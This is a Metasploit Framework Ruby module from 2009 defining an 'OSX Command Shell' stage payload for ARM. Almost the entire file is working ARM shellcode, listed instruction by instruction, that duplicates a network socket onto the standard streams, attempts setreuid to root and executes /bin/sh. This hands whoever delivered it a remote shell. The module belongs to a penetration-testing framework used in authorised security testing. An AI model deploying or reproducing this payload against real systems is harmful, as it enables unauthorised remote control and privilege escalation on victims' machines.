##
# $Id: shell.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/base/sessions/command_shell'


module Metasploit3

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OSX Command Shell',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Spawn a command shell',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_ARMLE,
			'Session'       => Msf::Sessions::CommandShell,
			'Stage'         =>
				{
					'Payload' =>
						[
							# vfork
							0xe3a0c042, # mov r12, #0x42
							0xe0200000, # eor r0, r0, r0
							0xef000080, # swi 128
							0xe3500000, # cmp r0, #0x0
							0x0a000017, # beq _exit

							# setup dup2
							0xe3a05002, # mov r5, #0x2

							# dup2
							0xe3a0c05a, # mov r12, #0x5a
							0xe1a0000a, # mov r0, r10
							0xe1a01005, # mov r1, r5
							0xef000080, # swi 128
							0xe2455001, # sub r5, r5, #0x1
							0xe3550000, # cmp r5, #0x0
							0xaafffff8, # bge _dup2

							# setreuid
							0xe3a00000, # mov r0, #0x0
							0xe3a01000, # mov r1, #0x0
							0xe3a0c07e, # mov r12, #0x7e
							0xef000080, # swi 128

							# execve
							0xe0455005, # sub r5, r5, r5
							0xe1a0600d, # mov r6, sp
							0xe24dd020, # sub sp, sp, #0x20
							0xe28f0014, # add r0, pc, #0x14
							0xe4860000, # str r0, [r6], #0
							0xe5865004, # str r5, [r6, #4]
							0xe1a01006, # mov r1, r6
							0xe3a02000, # mov r2, #0x0
							0xe3a0c03b, # mov r12, #0x3b
							0xef000080, # swi 128

							# /bin/sh
							0x6e69622f,
							0x0068732f,

							# exit
							0xe3a0c001, # mov r12, #0x1
							0xef000080  # swi 128
						].pack("V*")
				}
			))
	end

end
